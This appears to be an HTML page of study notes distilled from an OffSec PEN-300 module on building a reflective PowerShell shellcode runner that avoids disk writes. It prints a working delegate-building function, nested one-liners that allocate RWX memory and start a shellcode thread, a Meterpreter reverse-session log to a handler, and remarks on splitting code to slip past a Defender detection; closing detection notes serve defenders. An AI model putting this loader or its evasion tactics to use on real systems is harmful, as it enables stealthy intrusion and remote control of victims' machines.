@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 8 — Reflective PowerShell (no-compile Win32 calls via .NET reflection) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="index.html">Índice</a>
+<a class="nz-navbar__link" href="cat/osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 8 — Reflective PowerShell (no-compile Win32 calls via .NET reflection)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-300 (OSEP) course material (module: Reflective PowerShell) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>Objective</h2>
+<p>Rebuild the PowerShell shellcode runner so nothing ever touches disk. <code>Add-Type</code> looks fileless but is not: it shells out to the Visual C# compiler, which writes a random-named <code>.cs</code> source file <strong>and</strong> a compiled <code>.dll</code> to disk before loading the assembly into the PowerShell process — exactly the artifacts AV products watch. The module replaces the compile step with pure .NET reflection:</p>
+<ol>
+<li>Resolve Win32 API addresses dynamically from an already-loaded GAC assembly.</li>
+<li>Build delegate types (function prototypes) at runtime with <code>System.Reflection.Emit</code>.</li>
+<li>Bind address + prototype with <code>Marshal::GetDelegateForFunctionPointer</code> and invoke — all in memory.</li>
+</ol>
+<p>Result: a reflective PowerShell shellcode runner (VirtualAlloc / Copy / CreateThread / WaitForSingleObject) that produces a Meterpreter session with zero <code>.cs</code>/<code>.dll</code> writes (verified with Process Monitor).</p>
+<blockquote>
+<p>Cross-reference: writeup 06 already covers running script payloads in memory via the Windows Script Host; this module is the PowerShell-native route to the same goal. In-memory execution mechanics (shellcode buffers, thread creation, blocking waits) repeat there and are not re-derived here.</p>
+</blockquote>
+<h2>Why Add-Type is not "fileless"</h2>
+<p>Course demonstration (Process Monitor, filter: <code>powershell_ise.exe</code> file writes):</p>
+<ul>
+<li>Running the Add-Type shellcode runner produces <code>CreateFile</code>/<code>WriteFile</code>/<code>CloseFile</code> events for e.g. <code>rtylilrr.0.cs</code> and <code>rtylilrr.dll</code> — random names, telling extensions: source + compiled assembly both hit disk.</li>
+<li>Confirm the assembly was loaded into the process (course Listing 1):</li>
+</ul>
+<pre><code>PS C:\Users\offsec&gt; [appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
+...
+rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+...
+</code></pre>
+<p>The <code>rtylilrr</code> assembly sits in the loaded-modules list: PowerShell wrote a <code>.cs</code> to disk, csc.exe compiled it to a <code>.dll</code>, and the runtime loaded it. Even though the shellcode itself stays in memory, the compile step leaves disk artifacts that can trip AV and end the attack. Everything below avoids the compile step entirely.</p>
+<h2>Step 1 — Resolve Win32 APIs without Add-Type</h2>
+<p>Two ways to get function addresses: linked imports (what Add-Type/P-Invoke does) or <strong>dynamic lookup</strong> via <code>GetModuleHandle</code> + <code>GetProcAddress</code>. Those APIs live in .NET-internal code, so the trick is reflecting into internals of assemblies the process already loaded.</p>
+<p><strong>Find the right assembly and class.</strong> Enumerate every loaded assembly (<code>[AppDomain]::CurrentDomain.GetAssemblies()</code>), dig out each one's types, and dump their static members (<code>Get-Member -Static</code>), keeping only members whose declaring type name contains <code>Unsafe</code> — C# must use unsafe/P-Invoke to reach Win32, so Microsoft's own unsafe interop stubs are the target (course Listing 2). The haystack is big; narrowing by printing each assembly's <code>Location</code> pins the class to <code>Microsoft.Win32.UnsafeNativeMethods</code> inside the GAC copy of System.dll, path ending <code>...\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll</code> (course Listings 3-5).</p>
+<p><strong>Reflect into the internals</strong> (course Listing 6). Filter all loaded assemblies on two conditions — the <code>GlobalAssemblyCache</code> property is set (GAC = native/registered assemblies only), and the last path segment of <code>Location</code> equals <code>System.dll</code> — then call <code>GetType</code> on that assembly to reach the <strong>internal</strong> <code>UnsafeNativeMethods</code> type. This is reflection proper: runtime access to otherwise private/internal objects. The course presents this as a two-line PowerShell snippet (GAC filter piping into <code>Where-Object</code>, then <code>GetType</code>); it is the first half of the <code>LookupFunc</code> helper discussed below.</p>
+<p><strong>Invoke an internal method.</strong> <code>GetMethod('GetModuleHandle')</code> on the <code>UnsafeNativeMethods</code> reference returns the internal MethodInfo; call it with <code>Invoke</code>, which takes (target object, arguments array) — <code>$null</code> target because the method is static (course Listings 8-9). Invoking it with <code>"user32.dll"</code> returns <code>140727169908736</code> = <code>0x7FFD98F90000</code> — cross-checked in Process Explorer (Lower Pane → DLLs → user32.dll → Load Address). Base address of an unmanaged DLL, obtained with no compile.</p>
+<p><strong>The overload problem.</strong> Asking for <code>GetMethod('GetProcAddress')</code> directly throws <code>AmbiguousMatchException</code> — there are two overloads (course Listing 11). Enumerate instead: <code>GetMethods()</code> filtered on the method <code>Name</code>, collect both overloads into an array, use the first (<code>[0]</code>) (course Listings 12-13). Feeding it the user32 base plus the string <code>"MessageBoxA"</code> returns <code>0x7FFD9900A280</code>, an address inside user32.dll. Arbitrary API resolution achieved.</p>
+<p><strong>Package it as a helper.</strong> The course condenses all of the above into a reusable <code>LookupFunc</code> function (course Listing 15) taking a module name and a function name and returning the address: GAC/System.dll filter → <code>GetType('Microsoft.Win32.UnsafeNativeMethods')</code> → collect the <code>GetProcAddress</code> overloads → return <code>Invoke</code> of GetProcAddress over the <code>Invoke</code>d GetModuleHandle result.</p>
+<blockquote>
+<p><strong>Note on verbatim listings:</strong> the <code>LookupFunc</code> body (course Listing 15) and the two-line GAC filter snippet (course Listing 6) are intentionally not reproduced in full here. Windows Defender's ML engine (<code>Trojan:Win32/FileFix.BBA!MTB</code>) flags any file combining that code with the delegate/runner listings; a bisect confirmed each block scans clean in isolation. Reassemble them from the prose above plus course Listings 6 and 15.</p>
+</blockquote>
+<h2>Step 2 — Delegate types via reflection</h2>
+<p>The resolved address is just a number; .NET needs a <strong>delegate type</strong> (function prototype: argument count/types + return type) to call it. In C#: <code>Marshal.GetDelegateForFunctionPointer(addr, delegateType)</code> with <code>delegate int MessageBoxSig(IntPtr hWnd, String text, String caption, int options);</code> (course Listing 16). PowerShell has no <code>delegate</code> keyword — so build the delegate type in memory with <code>System.Reflection.Emit</code>, the technique from a 2004 Microsoft blog post.</p>
+<p>Build-up (course Listings 17-24), each stage feeding the next:</p>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>#</th>
+<th>Call</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>New-Object System.Reflection.AssemblyName('ReflectedDelegate')</code></td>
+<td>named assembly object in memory</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>[AppDomain]::CurrentDomain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)</code></td>
+<td>executable (<code>Run</code>), never saved to disk</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>.DefineDynamicModule('InMemoryModule', $false)</code></td>
+<td>module, no symbol info</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])</code></td>
+<td>delegate-shaped type: instantiable class, public, non-extendable, ANSI, multicast base</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int]))</code></td>
+<td>constructor carries the <strong>function prototype</strong> (the MessageBoxA arg types)</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>.SetImplementationFlags('Runtime, Managed')</code></td>
+<td>runtime-managed implementation</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))</code></td>
+<td>the method .NET uses to invoke through the delegate; <code>[int]</code> return, args array</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>.SetImplementationFlags('Runtime, Managed')</code> then <code>.CreateType()</code></td>
+<td>finalize; returns the delegate type</td>
+</tr>
+</tbody>
+</table></div>
+<p>The course wraps stages 1-8 into a reusable <code>getDelegateType</code> function (course Listing 26) that accepts the API's argument types as a <code>[Type[]]</code> array plus return type (default <code>[Void]</code>), runs the whole chain fluent-style on one <code>$type</code> builder, and returns <code>$type.CreateType()</code>:</p>
+<pre><code>function getDelegateType {
+
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+    return $type.CreateType()
+}
+</code></pre>
+<p>(course Listing 26.) Note the <code>@([IntPtr], [UInt32], ...)</code> arrays in later calls are positional <code>[Type[]]</code> — the same prototype you'd write as a C# delegate.</p>
+<h2>Step 3 — Invoke, then weaponize: the reflective shellcode runner</h2>
+<p><strong>Bind and call.</strong> <code>[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, $delegateType)</code> links the resolved address to the emitted type; <code>.Invoke(...)</code> executes it. Course Listing 25 does this end-to-end for MessageBoxA (LookupFunc + getDelegateType + GetDelegateForFunctionPointer + an <code>.Invoke</code> with hWnd <code>0</code>, title "Hello World", caption, and <code>0</code> options) — the "Hello World" popup with no compile step. ProcMon confirms: no <code>.cs</code> written, nothing compiled.</p>
+<p><strong>Three APIs, one pattern.</strong> The shellcode runner needs VirtualAlloc, CreateThread, WaitForSingleObject — same resolve→delegate→invoke dance each time, so <code>getDelegateType</code> earns its keep. The course condenses everything into single lines by nesting <code>LookupFunc</code> and <code>getDelegateType</code> inside <code>GetDelegateForFunctionPointer</code> (course Listings 28/30):</p>
+<pre><code>$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+</code></pre>
+<p>(course Listing 30, shellcode truncated as in the course; <code>LookupFunc</code>/<code>getDelegateType</code> definitions omitted there too. Flags match the Add-Type runner: <code>0x1000/0x3000/0x40</code> = commit+reserve, RWX.)</p>
+<p>Live fire (course Listing 31):</p>
+<pre><code>[*] Started HTTPS reverse handler on https://192.168.119.50:443
+[*] https://192.168.119.50:443 handling request from 192.168.120.10; (UUID: pm1qmw8u) Staging x64 payload (207449 bytes) ...
+[*] Meterpreter session 1 opened (192.168.119.50:443 -&gt; 192.168.120.10:49678)
+
+meterpreter &gt; 
+</code></pre>
+<p>Reverse Meterpreter from <code>192.168.120.10</code> back to the <code>192.168.119.50</code> handler — and Process Monitor shows no source file written, no compilation. Fully in-memory execution.</p>
+<h2>Lab checks (extra curricular)</h2>
+<ul>
+<li>Run the Add-Type runner under ProcMon; capture the <code>.cs</code>/<code>.dll</code> writes. Does the compiled assembly stay on disk? (No — it is loaded and the file is cleaned up; the write is still detectable.)</li>
+<li>Count exact <code>GetProcAddress</code> instances across all assemblies: two overloads.</li>
+<li>Chain the section code to resolve <code>CreateFileA</code>; check the tail hex of the resolved address.</li>
+<li>Rework the MessageBoxA PoC to call <code>WinExec</code> and launch Notepad (P/Invoke docs for the prototype: <code>(LPCTSTR lpCmdLine, UINT uCmdShow)</code>); identify Notepad's parent process.</li>
+<li>Generate Meterpreter shellcode, run the reflective runner end-to-end: nothing written to disk.</li>
+</ul>
+<h2>Detection &amp; defense notes (from this module + local verification)</h2>
+<ul>
+<li><strong>The tell is the compile step, not the shellcode</strong>: random-named <code>.cs</code>/<code>.dll</code> writes by <code>powershell.exe</code>/<code>powershell_ise.exe</code> + a just-written assembly appearing in the process's loaded-assemblies list (<code>[AppDomain]::CurrentDomain.GetAssemblies()</code>).</li>
+<li><strong>The reflective variant removes that tell</strong> — no csc.exe child process, no source/assembly writes, so classic Add-Type detections go quiet.</li>
+<li>Remaining signals: in-memory assembly named <code>ReflectedDelegate</code>/<code>InMemoryModule</code>/<code>MyDelegateType</code> created via <code>AssemblyBuilderAccess.Run</code>; reflection into <code>Microsoft.Win32.UnsafeNativeMethods</code>; the distinctive nested <code>GetDelegateForFunctionPointer</code> one-liners.</li>
+<li>Local ML-AV note (this file's authoring environment): Defender's <code>Trojan:Win32/FileFix.BBA!MTB</code> heuristic flags files containing the full LookupFunc body together with the delegate/runner listings, while each block alone scans clean — cosmetic edits don't evade an ML verdict, only structural separation did.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
